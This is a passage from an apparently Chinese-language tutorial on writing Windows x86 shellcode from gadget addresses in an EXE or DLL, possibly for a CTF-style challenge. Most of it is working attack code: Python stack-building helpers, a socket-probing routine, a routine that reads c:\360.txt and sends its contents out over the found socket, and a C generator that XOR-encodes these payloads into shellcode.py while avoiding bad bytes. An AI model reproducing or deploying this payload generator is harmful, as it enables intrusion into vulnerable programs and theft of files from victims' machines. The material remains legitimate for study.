`esp`   |  `0x4141294a`                     |        |                                                          |  

`esp+4` |  `0x50404046`                     |        |                                                          |  

`esp+8` |  填充值被返回到 `ebp`寄存器中    |        |                                                          |  

`esp+c` |  下一条指令的地址               |        |                                                          |  

如果想为 `ebx`设置一个值为  `0xaaaaaaaa`你只要在堆栈中构造如下数据就可以了  

`esp`   |  `0x41419E93`                     |        |                                                          |  

`esp+4` |  `0xaaaaaaaa`                     |        |                                                          |  

`esp+8` |  下一条指令的地址               |        |                                                          |  

上面的两个地址我们可以定义成 `python`的函数  

``` 
def build_dword_in_stack(val):  
  data=chr(val&0xff)  
  data+=chr((val>>8)&0xff)  
  data+=chr((val>>16)&0xff)  
  data+=chr((val>>24)&0xff)  
  return data  

def set_eax(val):  
  shellcode=build_dword_in_stack(0x4141294a)  
  shellcode+=build_dword_in_stack(val)  
  shellcode+=build_dword_in_stack(0x20202020)  #这可以是一个任意值，只是用来平衡堆栈的  
  return shellcode  

def set_ebx(val):  
  return build_dword_in_stack(0x41419e93)  
```

这样我们就可以调用以上函数来生成 `shellcode`

当然了想  `set_eax`, `set_ebx`这些功能简单的函数， 最好是写一个工具，通过遍历 `exe`或这 `dll`来直接生成。

上面的只是最简单的两个函数，至于其他的功能，就需要自己去通过 `IDA`挖掘出来。

例如想读内存，写内存。等功能， 如果你在 `exe`或 `dll` 中找到的简单功能足够强大，能写出来的 `sShellcode`的也

一定够强。 这就是仁者见仁，智者见智的事情了。

其实写 `sShellcode`也是一中管理程序接口的方法。 但是你需要去发现和管理这些程序接口

这样写 `shellcode`就像写汇编语言一样简单。 原理已经和大家讲清楚了， 大家就可以参考我的 `sShellcode`代码去

理解上面的 `python`文件了。 希望这遍文档对大家有帮助。 我要去看小说了， 就先不做科普了。

下面的 `C`函数是用来生成上面的 `sShellcode.py`的文件

``` 
#define VAL_sent      0x410154  
#define VAL_GetProcAddress    0x410028  
#define VAL_LoadLibraryA    0x41002c  
#define VAL_CreateFileA      0x4141a020  
#define VAL_CloseHandle      0x4141a03c  
#define INDIRECT_CALL(value)            __asm  _emit(0xff)        \  
                __asm   _emit(0x15)      \  
                __asm   _emit(value&0xff)    \  
                __asm   _emit((value>>8)&0xff)  \  
                __asm   _emit((value>>16)&0xff)  \  
                __asm   _emit((value>>24)&0xff)  

DWORD dwFunct2Start;  
DWORD dwFunct2Size;  
DWORD dwFunct3Start;  
DWORD dwFunct3Size;  
DWORD dwFunct1Start;  
DWORD dwFunct1Size;  

typedef struct _UNK_STRUCT  
{  
  char buf1[0x58];  
  union  
  {  
    unsigned char buf2[20];  
    DWORD dwVal[5];  
  };  
}UNK_STRUCT;  

DWORD gValue[5]={0x550d2b90,0xf8f6defd,0x10fe51d6,0xbdd4b735,0};  
```

``` 
bool check_password(char* username)  
{  
  UNK_STRUCT unknow;  
  unsigned char* ptr=(unsigned char*)&unknow.buf2;  
  memset(&unknow,0,sizeof(unknow));  
  sub_401000((int)&unknow,0);  
  sub_401060((int)&unknow,(int)username,5);  
  sub_402090((int)&unknow);  
  if(unknow.dwVal[0]==gValue[0])  
    printf("%s\n",username);  
  if(memcmp(gValue,unknow.buf2,16)==0)  
  {  
    printf("password is '%s'\n",username);  
    getchar();  
    return true;  
  }  
  return false;  
}  
```

``` 
__declspec(naked) unsigned char* probe_socket()  
{  
  char buf[4];  
  __asm  
  {  
    call local_quit  
    push ebp  
    mov ebp,esp  
    sub esp,__LOCAL_SIZE  
    xor ebx,ebx  

local_005:  
    push 0  
    push 1  
    lea eax,buf  
    push eax  
    push ebx  
  }  
  INDIRECT_CALL(VAL_sent)  
  __asm{  
    cmp eax,0  
    jge local_004  
    add ebx,4  
    cmp ebx,0x4000  
    jz local_006  
    jmp local_005  

local_004:  
    mov eax,ebx  
    jmp local_008  

local_006:  
    xor eax,eax  
    dec eax  

local_008:  
    mov esp,ebp  
    pop ebp  
    ret  

local_quit:  
    pop eax  
    mov dwFunct1Start,eax  
    lea eax,local_quit  
    sub eax,dwFunct1Start  
    mov dwFunct1Size,eax  
    mov eax,dwFunct1Start  
    ret  
  }  
}  
```

``` 
__declspec(naked) unsigned char* encode()  
{  
  __asm  
  {  
    call local_quit  
    lea eax,[esp+0x22]  
    add esp,-0x204  
    xor edx,edx  
    mov cl,0xbb  

local_loop:  
    xor [eax+edx],cl  
    inc edx  
    cmp dl,0x77  
    jbe local_loop  

local_quit:  
    pop eax  
    mov dwFunct3Start,eax  
    lea eax,local_quit  
    sub eax,dwFunct3Start  
    mov dwFunct3Size,eax  
    mov eax,dwFunct3Start  
    ret  
  }  
}  
```

``` 
__declspec(naked) unsigned char* sent_file_by_socket()  
{  
  char buffer[0x400];  
  DWORD dwReadSize;  
  __asm  
  {  
    call local_quit  
    call local_quit  
    cmp eax,-1  
    jz local_exit_1  
    push eax  
    call local_read_360_txt_file  

local_exit_1:  
    ret  

local_read_360_txt_file:  
    push ebp  
    mov ebp,esp  
    sub esp,__LOCAL_SIZE  
    call local_001      ;//ReadFile  
    _emit('R')  
    _emit('e')  
    _emit('a')  
    _emit('d')  
    _emit('F')  
    _emit('i')  
    _emit('l')  
    _emit('e')  
    _emit(0)  

local_001:  
    push 0x410318      ;//point of "Kernel32.dll"  
  }  

  INDIRECT_CALL(VAL_LoadLibraryA)  
  __asm push eax     ;;//module handle of "Kernel32.dll"  
  INDIRECT_CALL(VAL_GetProcAddress)  

  __asm{  
    mov esi,eax         ;//esi == ReadFile  
    xor eax,eax  
    push eax  
    push FILE_ATTRIBUTE_NORMAL  
    push OPEN_EXISTING  
    push eax  
    push eax  
    push GENERIC_READ  
    call local_002         ;//c:\360.txt  
    _emit('c')  
    _emit(':')  
    _emit('\\')  
    _emit('3')  
    _emit('6')  
    _emit('0')  
    _emit('.')  
    _emit('T')  
    _emit('X')  
    _emit('T')  
    _emit(0)  

    local_002:  
    }  

  INDIRECT_CALL(VAL_CreateFileA)  
  __asm{  
    mov edi,eax  
    xor ecx,ecx  
    push ecx  
    lea edx,dwReadSize  
    push edx  
    push 0x400  
    lea ebx,buffer  
    push ebx  
    push eax  
    call esi  
    cmp eax,0  
    jz local_003  
    push 0  
    lea eax,dwReadSize  
    push dword ptr[eax+0]  
    push ebx  
    push [ebp+8]  
    }  

  INDIRECT_CALL(VAL_sent)  

  __asm{  
local_003:  
    push edi  
  }  

  INDIRECT_CALL(VAL_CloseHandle)  

  __asm  
    {  
      //mov esp,ebp  
      //pop ebp  
      //ret  
      mov eax,[ebp+8]  
      mov [ebp+0x360],eax  
      mov esp,ebp  
      add ebp,0xa1c  
      add esp,0x32c  
      push 0x402b35  
      ret  
      _emit(0x30)  
    }  

  __asm{  
local_quit:  
      pop eax  
      mov dwFunct2Start,eax  
      lea eax,local_quit  
      sub eax,dwFunct2Start  
      mov dwFunct2Size,eax  
      mov eax,dwFunct2Start  
      ret  
    }  
}  
```

``` 
char gInitFlags[256];  

using namespace std;  

char dict[]="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_+=}\]\[{|\\\\?/.>,<;:'\"~\`";  

int _tmain(int argc, _TCHAR* argv[])  
{  
  unsigned char *pbuf,*pbuf2,*pencode;  
  DWORD i,j;  
  unsigned char xorvalue;  
  memset(gInitFlags,0,sizeof(gInitFlags));  
  pencode=encode();  
  pbuf=probe_socket();  
  for(i=0;i<dwFunct1Size;i++)  
  {  
    if(pbuf[i])  
      gInitFlags[pbuf[i]]=1;  
  }  
  pbuf2=sent_file_by_socket();  
  for(i=0;i<dwFunct2Size;i++)  
  {  
    if(pbuf2[i])  
      gInitFlags[pbuf2[i]]=1;  
  }  
  for(i=1;i<sizeof(gInitFlags);i++)  
  {  
    if(gInitFlags[i])  
      continue;  
    xorvalue=i;  
    for(j=0;j<dwFunct1Size;j++)  
    {  
      if((pbuf[j]^xorvalue)==0x0a||(pbuf[j]^xorvalue)==0x0d)  
        break;  
    }  
    if(j<dwFunct1Size)  
      continue;  
    for(j=0;j<dwFunct2Size;j++)  
    {  
      if((pbuf2[j]^xorvalue)==0x0a||(pbuf2[j]^xorvalue)==0x0d)  
        break;  
    }  
```



```
if(j>=dwFunct2Size)
  break;
}
ofstream of;
char str[256];
unsigned char byteval;
of.open("shellcode.py");
sprintf(str,"#=======size %d===decode====\\n",dwFunct3Size);
of<<str;
for(i=0;i<dwFunct3Size;i++)
{
    byteval=pencode[i];
    switch(byteval)
    {
    case 0x22:
      byteval=12+dwFunct3Size;
      break;
    case 0xbb:
      byteval=xorvalue;
      break;
    case 0x77:
      byteval=dwFunct2Size+dwFunct1Size;
      break;
    }
    if(i==0)
      sprintf(str,"decode_func=chr(0x%02x)\\n",byteval);
    else
      sprintf(str,"decode_func+=chr(0x%02x)\\n",byteval);
    of<<str;
}
sprintf(str,"#=======size %d===probe_socket====\\n",dwFunct1Size);
of<<str;
for(i=0;i<dwFunct1Size;i++)
{
    if(i==0)
      sprintf(str,"probe_socket_func=chr(0x%02x)\\n",pbuf[i]^xorvalue);
    else
      sprintf(str,"probe_socket_func+=chr(0x%02x)\\n",pbuf[i]^xorvalue);
    of<<str;
}
sprintf(str,"#=======size %d===sent_file_by_socket====\\n",dwFunct2Size);
of<<str;
for(i=0;i<dwFunct2Size-1;i++)
{
    if(i==0)
      sprintf(str,"sent_file_by_socket_func=chr(0x%02x)\\n",pbuf2[i]^xorvalue);
    else
      sprintf(str,"sent_file_by_socket_func+=chr(0x%02x)\\n",pbuf2[i]^xorvalue);
    of<<str;
}
sprintf(str,"sent_file_by_socket_func+=chr(0x%02x)\\n",pbuf2[i]);
of<<str;
sprintf(str,"xorvalue=0x%02x\\n",xorvalue);
of<<str;
sprintf(str,"probe_socket_func_len=0x%02x\\n",dwFunct1Size);
of<<str;
sprintf(str,"sent_file_by_socket_func_len=0x%02x\\n",dwFunct2Size);
of<<str;
of.close();
return 0;
}
```
